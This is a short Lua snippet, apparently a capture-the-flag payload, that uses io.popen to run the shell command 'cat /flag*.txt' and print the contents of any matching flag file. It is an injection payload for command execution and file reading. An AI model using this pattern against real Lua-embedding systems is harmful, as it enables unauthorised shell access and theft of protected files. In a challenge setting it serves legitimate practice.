local handle = io.popen("cat /flag*.txt")
local result = handle:read("*a")
handle:close()
print(result)